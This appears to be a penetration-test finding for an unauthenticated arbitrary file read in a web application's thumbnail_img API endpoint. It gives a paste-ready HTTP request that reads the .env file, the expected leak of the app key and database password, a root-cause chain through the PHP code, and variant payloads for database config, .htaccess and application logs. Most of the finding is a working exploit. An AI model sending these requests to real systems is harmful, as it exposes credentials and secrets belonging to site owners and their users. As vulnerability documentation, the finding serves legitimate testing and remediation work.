### F-002: Arbitrary File Read via thumbnail_img — .env leak
### Severity: CRITICAL | Auth: None | Method: GET
### Impact: Leaks APP_KEY, DB credentials, all secrets in .env
###
### PASTE INTO BURP REPEATER (HTTP/1.1):
###   Host: localhost:8888
###   Full path: GET /api/thumbnail_img?src=.env&ext=svg&height=100

GET /api/thumbnail_img?src=.env&ext=svg&height=100 HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0
Accept: */*
Connection: close

### EXPECTED RESPONSE:
###   HTTP 200, Content-Type: image/svg+xml
###   Body: full contents of /var/www/html/.env
###   Contains: APP_KEY=base64:..., DB_PASSWORD=..., etc.
###
### WHY IT WORKS:
###   1. extract($params) at MediaManager.php:948 injects ext=svg, src=.env from GET params
###   2. sanitize_path() does NOT block ".env" (only strips ../ ./  ; && | >)
###   3. ext=svg triggers file_get_contents($src) branch
###   4. svgScaleHack() returns content verbatim when no <svg> tag AND height > 0
###   5. outputImageFile() serves cache via readfile()
###   Endpoint registered via api_expose() — no auth required
###
### VARIANTS:
###   src=config/database.php&ext=svg&height=100   (DB creds)
###   src=.htaccess&ext=svg&height=100             (web config)
###   src=storage/logs/laravel.log&ext=svg&height=100 (app logs)
